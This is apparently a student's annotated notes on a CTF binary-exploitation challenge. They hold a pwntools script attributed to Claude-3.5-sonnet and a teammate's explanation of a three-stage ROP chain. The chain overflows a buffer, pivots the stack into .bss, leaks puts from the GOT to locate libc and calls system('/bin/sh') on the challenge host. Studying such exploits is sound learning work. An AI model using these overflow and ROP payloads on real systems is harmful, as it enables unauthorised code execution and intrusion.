# Claude-3.5-sonnet's script that got into shell but commands cannot be run normally

```py
#!/usr/bin/env python3 
from pwn import * 

# Setup binary
elf = ELF("program") # what is an elf and what does it do in this context?
rop = ROP(elf) # I know what is an ROP chain but what does a rop object here, what does it do?
libc = ELF("./libc") # what if no libc is provided?
# Settings
context.binary = "./program" # ?? again don't know what this do, no clue at all
context.log_level = 'debug' # ?? again don't know what this do, no clue at all 

r = remote("chal.firebird.sh", 35047) 

# Gadgets
# where are these addresses located? I guess not in the program? Because there's no instruction address that goes both `leave` and `ret` simultaneously 
pop_rdi = 0x400a33  # pop rdi instruction address, ROPgadget --all --binary <program> | grep <instruction>
leave_ret = 0x400868 # leave ; ret instruction address, ROPgadget --all --binary <program> | grep <instruction>

# BSS addresses for our fake stacks
# what's a .bss section exactly? Just curious, I forgot
buf1 = elf.bss() + 0x800
buf2 = elf.bss() + 0x700

# Stage 1: Pass the first read in main
r.recvuntil(b"Write some words on the top right corner of the wall:")
r.sendline(b"A" * 8)

# Stage 2: First ROP chain, these are written in the stack frame of my_read function?
payload = flat(
	b'A' * 48,        # Fill buffer, up to rbp. 
	buf1,             # New rbp for leave;ret. Address is elf.bss() + 0x800
	pop_rdi,          # ROP chain starts. Pop buf1 (right below it) as 1st argument into next `my_read` function
	buf1,             # Argument for my_read
	elf.sym['my_read'],  # Read next stage. Wait for input again I guess?
	leave_ret         # Migrate stack to buf1
)

# Wait for the second prompt
r.recvuntil(b"Write some words right in the center of the wall with GREAT care:")
r.sendline(payload)

# Stage 3: Second ROP chain, these are written in the stack frame of buf1?
payload2 = flat(
	buf2,             # Next fake stack frame
	pop_rdi,          # Setup puts(got.puts)
	elf.got['puts'],
	elf.plt['puts'],
	# Read next payload into buf2
	pop_rdi,
	buf2,
	elf.sym['my_read'],
	leave_ret         # Migrate to buf2
)

r.sendline(payload2)

# Get puts leak and calculate libc base
#puts_leak = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) # what is this?
#log.info(f'Puts leak: {hex(puts_leak)}') # what is this?

puts = int.from_bytes(r.recvuntil(b'\x7f'), 'little') # what is this?

puts_offset = libc.sym['puts'] # offset of puts function from base, # what if no libc is provided?
libc.address = puts - puts_offset # libc base address. # what if no libc is provided?

log.info(hex(libc.address)) # what if no libc is provided?

pause()  # Add pause to check leak

# Stage 4: Final ROP chain, , these are written in the stack frame of buf2?
payload3 = flat(
	b'A' * 8,         # Padding
	pop_rdi,
	#puts_leak + 0x13000,  # /bin/sh offset (adjust after leak)
	#puts_leak - 0x80970   # system offset (adjust after leak)
	#pop_rdi,
	next(libc.search(b'/bin/sh')), # what is this? # what if no libc is provided?

	libc.sym['system'] # I now this calls system() to get the shell but what is sym? # what if no libc is provided?
)

r.sendline(payload3)
r.interactive()


```


atopos' idea

- I send 3 payloads in total 
first we can use the `pop rsi; pop r15; ret`  gadget for modifying rsi // why modify rsi and why `pop rsi` is followed by `pop r15`?  

- using `pop rdi; ret` gadget for modifying rdi
- then can use my_read func to read a string
- The first payload for creating a space for later payloads
- the second payload for getting the address of 'puts' and creating another space for the third payload
- the third payload for writing '\bin\sh' into rsi and call system()
and remember align the stack before calling system() // what is stack aligning? what does it do in this case?

- first payload here need to be split into two part otherwise there is no enough space
- oh i forget, payload1 is inputted through input twice
- cause the space of the two string the application ask to input is close
```
r.send(payload1[-0x30:].ljust(0x30, b'A'))
r.recvuntil(b'Write some words right in the center of the wall with GREAT care:\n')
r.send(payload1[:0x60].ljust(0x60, b'A'))
```
- i use this way to send payload1. The length of my payload1 is just the max length of payload that can be inputted
```py
payload1 = flat(
    b'A' * 48,
    payload2_buf_addr,

    rsi_r15_ret_gadget,
    88, # length of payload2
    0,
    rdi_ret_gadget,
    payload2_buf_addr,
    elf.sym['my_read'],

    lev_ret_addr
)

payload2 = flat(
    payload3_buf_addr,

    rdi_ret_addr,
    elf.got['puts'],
    elf.plt['puts'],

    rsi_r15_ret_addr,
    40, # length of payload3
    0,
    rdi_ret_addr,
    payload3_buf_addr,
    elf.sym['my_read'],

    lev_ret_addr
)

payload3 = flat(
    b'A' * 8,

    ret_addr, # for stack align

    rdi_ret_addr,
    addr_libc_bin_sh,
    addr_libc_system
)
```